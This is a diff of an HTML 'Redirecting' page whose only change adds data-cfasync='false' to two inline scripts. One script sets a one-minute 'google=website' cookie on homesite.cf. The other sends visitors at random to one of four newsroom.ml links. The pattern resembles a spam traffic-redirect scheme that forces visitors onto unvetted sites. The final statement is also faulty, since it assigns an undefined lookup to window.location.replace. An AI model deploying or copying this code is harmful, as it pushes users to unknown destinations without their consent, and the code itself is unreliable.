@@ -2,10 +2,10 @@
 <html>
 <head>
 <title>Redirecting</title>
-<script>
+<script data-cfasync='false'>
 if (document.cookie.indexOf("google=website") >= 0) { } else { var date = new Date(); date.setTime(date.getTime()+(60*1000)); var expiry = '; expires=' + date.toUTCString(); document.cookie = 'google=website'+'; path=/'+'; domain=.homesite.cf'+'; SameSite=none'+'; Secure=true'+expiry; }
 </script>
-<script>
+<script data-cfasync='false'>
 var random = new Array(); random[0]="https://newsroom.ml/1?600"; random[1]="https://newsroom.ml/3?600"; random[2]="https://newsroom.ml/4?600"; random[3]="https://newsroom.ml/5?600"; function nextPage() { var state = null; if (localStorage.randomState) { state = JSON.parse(localStorage.randomState); if (state.order.length != random.length) { state = null; }} if (!state) { state = { order: [], index: 0 }; for (var i = 0; i < random.length; i++) { state.order.splice(Math.floor(Math.random() * (i + 1)), 0, i);}} var page = random[state.order[state.index]]; state.index = (state.index + 1) % random.length; localStorage.randomState = JSON.stringify(state); location.href = page; }; window.location.replace = random[nextPage()]
 </script>
 </head>
